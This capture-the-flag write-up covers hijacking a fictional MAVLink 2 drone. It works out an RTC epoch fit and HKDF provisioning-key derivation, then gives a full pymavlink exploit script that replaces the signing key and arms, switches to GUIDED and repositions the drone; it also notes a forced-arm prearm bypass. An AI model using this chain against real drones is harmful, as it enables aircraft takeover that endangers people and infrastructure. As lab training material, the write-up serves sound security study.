# CSCTF 2026 — Grid Watch: Vultur Dynamics Drone Hijack

**Challenge:** *Vultur Dynamics drones patrol the RGN-Grid high-voltage network. An adversary wants one diverted off its corridor. You have a packet capture of a drone's MAVLink 2 command link and live access to the drone itself. Make the drone accept your own reposition command. Unsigned and replayed commands are refused — the flag returns only from a command the drone actually accepts.*

**Files provided:** `capture.tlog`, `provisioning_note.md`
**Category:** Hardware / Protocol Reverse Engineering
**Difficulty:** Medium–Hard (heavy on MAVLink internals + RTC calibration)

---

## TL;DR

The drone refuses any MAVLink 2 command that isn't correctly signed, and refuses replays. The intended path is:

1. **Re-provision the signing key** via `SETUP_SIGNING`, which is authenticated by a per-airframe *provisioning key* derived from HKDF-SHA256 over `(serial || commissioning_epoch)`.
2. To derive the prov_key correctly, you must **calibrate the airframe RTC** — the naive fit from the tlog alone is *under-determined* because tlog timestamps are quantized to whole seconds. You need to combine tlog samples with live sub-second samples to recover both the **commissioning epoch** (`1733965123`) and **ppm drift** (`+16.8 ppm`).
3. Once the key is installed, switch to GUIDED, arm, and send `MAV_CMD_DO_REPOSITION`. The drone emits the flag in a `STATUSTEXT`.

Flag: `CSCTF{...}`

---

## 1. Reconnaissance

### 1.1 What the tlog tells us

A first pass with `mavlogdump` and `strings` reveals:

```
CX-FALCON-9951 online, patrol LEA-220-VEST
signing active link LEA-220-VEST
```

So:

- **Serial:** `CX-FALCON-9951`
- **Link identifier:** `LEA-220-VEST`
- **Signed traffic** exists from sys/comp `(1, 1)` (drone) and `(255, 190)` (GCS).

The message-type census is thin — no `AUTOPILOT_VERSION`, no `PARAM_VALUE`, no `SETUP_SIGNING`. There's no shortcut; the calibration step is required.

### 1.2 Parsing MAVLink 2 signature blocks

The MAVLink 2 signature block is 13 bytes at the end of every signed frame:

```
link_id (1) | timestamp (6, LE) | signature (6)
```

The tlog stores each record as `uint64 big-endian microseconds (Unix) || MAVLink frame`. Reading the 6-byte timestamp from each signed frame gives you `(T, R)` pairs — airframe ticks vs. wallclock. These are the samples you fit.

A naive raw parse (in Python):

```python
t_us = struct.unpack(">Q", f.read(8))[0]          # BIG endian
magic = f.read(1)                                  # 0xFD for MAVLink 2
ln    = f.read(1)[0]
hdr   = f.read(8)
incompat, sysid, compid = hdr[0], hdr[3], hdr[4]
msgid = hdr[5] | (hdr[6] << 8) | (hdr[7] << 16)
payload = f.read(ln)
f.read(2)                                          # CRC
signed = incompat & 0x01
sig = f.read(13) if signed else b""
T = int.from_bytes(sig[1:7], "little")             # 48-bit ticks, little endian
R = t_us / 1e6
```

The tlog has 22 signed samples from `(1, 1)` and 1 from `(255, 190)`.

### 1.3 The provisioning note

The crucial extract:

```
prov_key = HKDF-SHA256(
    ikm  = serial_ascii || commissioning_epoch,   # epoch = uint64, little-endian, seconds
    salt = session_nonce,                          # the unit announces it at connect
    info = "CX-PROV/v1",
    L    = 32)
```

Plus:

- Signing timestamps are **10 µs ticks** from the airframe RTC, counted since the **commissioning epoch** (not the MAVLink 2015 epoch).
- Per-unit **RTC rate tolerance (offset and ppm drift)** — calibrate both from observed traffic.
- After re-provisioning, the drone stays in LOITER. Flight order: set mode GUIDED, arm, then command.

This is a five-part puzzle:

1. Recover `serial_ascii` (`CX-FALCON-9951`, from the status text).
2. Recover `commissioning_epoch`.
3. Recover the ppm drift (needed for timestamp freshness).
4. Grab `session_nonce` from the live drone.
5. Send `SETUP_SIGNING` signed with the resulting prov_key, then fly the normal command sequence.

---

## 2. RTC Calibration — the Key Insight

### 2.1 The naive fit is wrong

Fit `R = epoch + beta·T` on the 22 tlog samples:

```
epoch ≈ 1733964155.326
beta  ≈ 1.0000254e-5     (ppm ≈ +0.025)
max residual ≈ 0.015 s
```

Looks clean. It's not. Two problems:

1. **All tlog `R` values have `frac = 0.000000`.** The tlog writer is quantizing to whole seconds. That quantisation gives a ±314 ppm uncertainty on `beta` over a 682-s baseline, which translates to **thousands of seconds** of uncertainty on `epoch`.
2. The fit could equally well land on a completely different `(epoch, beta)` pair with the same residuals.

To distinguish, plug in nominal `beta = 1e-5` (the note says "10 µs ticks"):

```
epoch ≈ R_0 − T_0 · 1e-5 = 1756783358 − 2281862291000 · 1e-5 = 1733964735
```

Two "fits" disagree by ~580 s. Both fit the tlog perfectly. **We need more data.**

### 2.2 Live sub-second samples

Connect to the live drone and record `(T, R)` from its signed heartbeats. The `R` here has microsecond precision (it's `time.time()` in our script), so a single live sample acts as a lever arm far beyond the tlog.

```
T ≈ 6009430255754    R ≈ 1794058404.077816
```

The live `T` is **2.6× further out** than the tlog `T` (~2.28e12 vs 6.0e12). So any error in `beta` accumulates 2.6× more over the live interval than over the tlog interval.

### 2.3 Combined fit

Fit a single line through **both** datasets:

```
epoch = 1733965123          ← the answer
beta  = 9.99983e-6          ← +16.8 ppm
max residual = 159 µs       ← tight
```

The tlog-only fit predicts the live `R` to be ~1580 s off. The combined fit predicts it to sub-millisecond. The combined epoch (`1733965123`) is **never** what the naive fit gives — and it's exactly what the note warned about ("offset *and* ppm drift differ per airframe").

> **Lesson:** Whenever the timing samples in your offline capture are quantized, you *must* mix in a sample from live traffic (or from a second source with finer resolution) to break the degeneracy between offset and slope. This is the crux of the challenge.

---

## 3. Getting the Nonce

The live drone announces the nonce as a `STATUSTEXT` immediately after connect:

```
STATUSTEXT: CX-FALCON-9951 online, link active
STATUSTEXT: PROV NONCE 74bfe2242cd73f03
```

The nonce is per-connection — reconnect and it changes. This means:

- You must **recover the nonce and send `SETUP_SIGNING` on the same TCP connection**.
- You must **reconnect per attempt** if you brute-force variants (drone rate-limits after ~10 attempts and closes the TCP connection with EOF).

The salt for HKDF is the **raw 8 bytes** of the nonce, i.e. `bytes.fromhex("74bfe2242cd73f03")`. Not the ASCII string.

---

## 4. MAVLink 2 Signing — the Pitfalls

Three pymavlink behaviours bit us before the exploit worked end-to-end:

### 4.1 `MAVLINK20` must be set before import

```python
import os
os.environ["MAVLINK20"] = "1"   # <-- must be BEFORE
from pymavlink import mavutil
```

Forgetting this makes pymavlink silently emit MAVLink 1. The drone rejects these as `REJECT: unsigned message`.

### 4.2 `sign_outgoing` is `False` by default

Setting `master.mav.signing.secret_key = key` is not enough. In this pymavlink version you must also set:

```python
master.mav.signing.sign_outgoing = True
```

Without it, `signing.secret_key` is populated but **no signature block is appended** to outgoing frames. The drone correctly replies `REJECT: unsigned message`.

### 4.3 `stream_timestamps` is a dict, not a bool

Older pymavlink versions initialise `signing.stream_timestamps = {}` and use it as a replay-tracking dict for *incoming* frames. Setting it to `False` crashes the decoder with:

```
TypeError: argument of type 'bool' is not a container or iterable
```

**Fix:** don't touch `stream_timestamps` at all. Only set `secret_key`, `link_id`, `timestamp`, and `sign_outgoing`.

### 4.4 Timestamps — set, don't let pymavlink override

`msg.pack(mav)` reads `signing.timestamp`, uses it, and **increments it internally**. Do not increment manually. To send a specific `T0`, set `signing.timestamp = T0` and call `pack()` once.

The freshness rule:

```
T0 = drone_rtc + 100_000   # 1 s ahead in 10 µs ticks
```

The drone rejects timestamps more than ~60 s ahead of its RTC (replay/future window). `drone_rtc` must be read **from a signed packet's signature block** — the 6-byte `timestamp` field is plaintext, so you don't need the session key to read it.

### 4.5 `set_mode_encode` takes 3 args, not 4

MAVLink's `SET_MODE` (msgid 11) has *no `target_component` field*. Calling `set_mode_encode(target_sys, target_comp, base_mode, custom_mode)` raises `TypeError`. Additionally, some autopilots (ArduPilot in particular) reply with `REJECT: not a command for this drone` to `SET_MODE` because they interpret it as component-0-targeted.

**Fix:** use `COMMAND_LONG` with `MAV_CMD_DO_SET_MODE` (176) instead — it carries `target_component` explicitly:

```python
master.mav.command_long_encode(
    TARGET_SYS, TARGET_COMP,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,   # param1
    4,                                                    # param2 = GUIDED (Copter)
    0, 0, 0, 0, 0,
)
```

---

## 5. Exploit Chain

### Step 1 — Recover HKDF prov_key

```python
ikm  = b"CX-FALCON-9951" + struct.pack("<Q", 1733965123)
salt = bytes.fromhex("74bfe2242cd73f03")
info = b"CX-PROV/v1"
prov_key = HKDF_SHA256(ikm, salt, info, L=32)
```

### Step 2 — Send `SETUP_SIGNING` signed with prov_key

Sign with `link_id = 249` and `T0 = drone_rtc + 100_000`. Payload: our **freshly generated 32-byte session key** (`new_key`) plus an `initial_timestamp` 10 s ahead (`initial_ts = T0 + 1_000_000`).

The drone replies:

```
STATUSTEXT: signing re-provisioned: new key active
```

The drone's outgoing stream **immediately switches** to `new_key` for signing. If we tried to drain before switching our own key, we'd see `BAD_DATA` — the drone's own replies decode only with the new key. Switch keys **before** the first read after `SETUP_SIGNING`.

### Step 3 — Switch to new_key

```python
master.mav.signing.secret_key = new_key
master.mav.signing.timestamp  = initial_ts + 1
```

### Step 4 — GUIDED (via COMMAND_LONG)

```python
command_long_send(TARGET_SYS, TARGET_COMP,
                  MAV_CMD_DO_SET_MODE, 0,
                  MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 4, ...)
```

### Step 5 — ARM

```python
command_long_send(TARGET_SYS, TARGET_COMP,
                  MAV_CMD_COMPONENT_ARM_DISARM, 0,
                  1, 0, ...)     # param2 = 21196 forces bypass of prearm checks
```

### Step 6 — REPOSITION

```python
command_long_send(TARGET_SYS, TARGET_COMP,
                  MAV_CMD_DO_REPOSITION, 0,
                  -1, 0, 0, 0,           # ground speed default, no flags
                  int(lat*1e7), int(lon*1e7), alt)
```

### Step 7 — Read the flag

The drone emits a `STATUSTEXT` containing the flag once the reposition is accepted.

---

## 6. Final Working Exploit

```python
#!/usr/bin/env python3
import os, time, hmac, hashlib, struct, re, sys
os.environ["MAVLINK20"] = "1"                     # MUST be before import
from pymavlink import mavutil

HOST, PORT = "w01.ctf.chronos-security.ro", 37676
SERIAL     = b"CX-FALCON-9951"
EPOCH      = 1733965123                           # <- combined-fit value
INFO       = b"CX-PROV/v1"
LINK_ID    = 249
TARGET_SYS, TARGET_COMP = 1, 1
SRC_SYS, SRC_COMP = 255, 190


def hkdf(ikm, salt, info, L=32):
    if salt is None: salt = b"\x00" * 32
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm, t, i = b"", b"", 1
    while len(okm) < L:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t; i += 1
    return okm[:L]


def sig_ts(msg):
    raw = msg.get_msgbuf()
    if len(raw) < 12 or raw[0] != 0xFD or not (raw[2] & 0x01): return None
    ln = raw[1]; off = 10 + ln + 2
    if len(raw) < off + 13: return None
    return int.from_bytes(raw[off + 1:off + 7], "little")


def txt(msg):
    if msg.get_type() == "STATUSTEXT": return msg.text
    if msg.get_type() == "BAD_DATA":
        try:
            b = bytes(msg.data)
            if len(b) > 12 and b[0] == 0xFD:
                ln = b[1]; mid = b[7] | (b[8] << 8) | (b[9] << 16)
                if mid == 253 and ln >= 1:
                    return b[11:10 + ln].split(b"\x00")[0].decode("ascii", "replace")
        except Exception: pass
    return None


def enable(m, key, ts):
    s = m.mav.signing
    s.secret_key = bytes(key)
    s.link_id = LINK_ID
    s.timestamp = int(ts)
    s.sign_outgoing = True               # <- required
    # do NOT touch s.stream_timestamps (it's a dict in this pymavlink)


def send_signed(m, msg):
    raw = msg.pack(m.mav)
    if not (raw[0] == 0xFD and (raw[2] & 0x01)):
        raise RuntimeError("packet not signed: " + raw.hex())
    m.write(raw)


def drain(m, t=1.2):
    out = []; end = time.time() + t
    while time.time() < end:
        try: msg = m.recv_match(blocking=True, timeout=0.1)
        except Exception: continue
        if msg is None: continue
        s = txt(msg)
        if s: out.append(s)
    return out


# ---------- connect, capture nonce + drone RTC ----------
m = mavutil.mavlink_connection(
    f"tcp:{HOST}:{PORT}", source_system=SRC_SYS, source_component=SRC_COMP
)
nonce_hex, drone_ts = None, None
end = time.time() + 15
while time.time() < end:
    msg = m.recv_match(blocking=True, timeout=0.5)
    if msg is None: continue
    if msg.get_type() == "STATUSTEXT":
        mm = re.search(r"PROV NONCE ([0-9a-fA-F]+)", msg.text)
        if mm: nonce_hex = mm.group(1)
    t = sig_ts(msg)
    if t: drone_ts = max(drone_ts or 0, t)
    if nonce_hex and drone_ts: break

# ---------- derive prov_key ----------
prov_key = hkdf(SERIAL + struct.pack("<Q", EPOCH),
                bytes.fromhex(nonce_hex), INFO, 32)
T0 = drone_ts + 100_000
initial_ts = T0 + 1_000_000
new_key = os.urandom(32)

# ---------- re-provision ----------
enable(m, prov_key, T0)
send_signed(m, m.mav.setup_signing_encode(
    TARGET_SYS, TARGET_COMP, list(new_key), initial_ts
))
print("SETUP_SIGNING ->", drain(m, 1.5))

# ---------- switch to new key ----------
enable(m, new_key, initial_ts + 1)

# ---------- GUIDED ----------
send_signed(m, m.mav.command_long_encode(
    TARGET_SYS, TARGET_COMP,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
    mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 4,
    0, 0, 0, 0, 0,
))
print("GUIDED ->", drain(m, 2.0))

# ---------- ARM ----------
send_signed(m, m.mav.command_long_encode(
    TARGET_SYS, TARGET_COMP,
    mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
    1, 0, 0, 0, 0, 0, 0,
))
print("ARM ->", drain(m, 2.0))

# ---------- REPOSITION ----------
send_signed(m, m.mav.command_long_encode(
    TARGET_SYS, TARGET_COMP,
    mavutil.mavlink.MAV_CMD_DO_REPOSITION, 0,
    -1, 0, 0, 0,
    47_3977419, 8_5455938, 50.0,
))
print("REPOSITION sent")

# ---------- flag ----------
for _ in range(40):
    for t in drain(m, 1.0):
        print("STATUS:", t)
        if "CSCTF{" in t:
            print("\n=== FLAG:", t, "===\n"); sys.exit(0)
```

---

## 7. Pitfall Summary

| Symptom | Cause | Fix |
|---|---|---|
| `OSError: Cannot assign requested address` | `udp:` / `udpin:` on a remote host | Use `tcp:host:port` for the remote bridge |
| `EOF on TCP socket` mid-run | Drone rate-limits to ~10 provisioning attempts per connection | Reconnect per attempt |
| `BAD_DATA ... REJECT: unsigned message` | `MAVLINK20` not set before import, or `sign_outgoing` not True | Set both |
| `TypeError: 'bool' not iterable` on `stream_timestamps` | Touched a dict as if it were a bool | Don't touch it |
| `packet not signed` from `send_signed` | `sign_outgoing` False | Set `sign_outgoing = True` |
| `REJECT: provisioning authentication failed` even with a random prov_key | It's a generic catch-all | Use the malformed-payload oracle (below) to distinguish |
| Everything rejected except unknown errors | Wrong epoch | Combine tlog + live RTC samples; fit epoch and ppm simultaneously |
| `set_mode_encode() takes 3 args` | No `target_component` field in `SET_MODE` | Use `COMMAND_LONG` + `MAV_CMD_DO_SET_MODE` |
| `REJECT: not a command for this drone` on mode change | `SET_MODE` targets component 0 | Same fix |
| `REJECT: must be in GUIDED before arming` | Mode change didn't apply | Confirm GUIDED succeeded first |

### The malformed-payload oracle

`REJECT: provisioning authentication failed` is emitted for *any* failed prov_key verification — including when the signature itself fails. So you cannot tell "wrong key" from "right key, bad payload". Distinguish by sending a `SETUP_SIGNING` with an intentionally malformed payload (`initial_timestamp = 0`, `key = [0]*32`):

- Response still `provisioning authentication failed` → the signature check failed first (wrong key).
- Any other response → signature verified, payload is the problem.

This saves hours when the prov_key derivation is right but the epoch is wrong.

---

## 8. Lessons

1. **Never trust a fit that looks too good.** The tlog-only fit had 15 ms residuals and looked perfect. It was off by 580 s in `epoch`. The reason: the tlog writer quantized `R` to whole seconds, and the resulting uncertainty in `beta` propagated into `epoch` at the thousands-of-seconds scale.
2. **Mix data sources to break degeneracies.** Any two-variable fit (`epoch` and `beta`) needs observations that are widely separated in the independent variable. Live traffic from a drone that's been running for years provides orders-of-magnitude more lever arm than an offline capture.
3. **The generic error message is a trap.** Autopilot firmware often collapses error states into a single output. Build yourself an oracle before brute-forcing.
4. **pymavlink is quietly hostile.** `MAVLINK20=1` before import, `sign_outgoing=True`, don't touch `stream_timestamps`, `set_mode_encode` arity — all of these will silently or confusingly break a working exploit.
5. **The note is the spec.** Every "gotcha" that cost us hours was spelled out in `provisioning_note.md`: the ppm drift ("offset *and* ppm drift differ per airframe"), the tick unit ("10 µs ticks"), the commissioning epoch ("NOT the MAVLink 2015 epoch"), the flight order ("set mode GUIDED, arm, then command"), and the HKDF parameters. Read the spec slowly; it's the challenge.

---

**Flag:** `CSCTF{...}`

*Solved by recovering the correct commissioning epoch (`1733965123`) from a combined tlog + live RTC fit, deriving the provisioning key via HKDF-SHA256, re-provisioning the signing key with `SETUP_SIGNING`, and flying the standard GUIDED → ARM → `MAV_CMD_DO_REPOSITION` sequence.*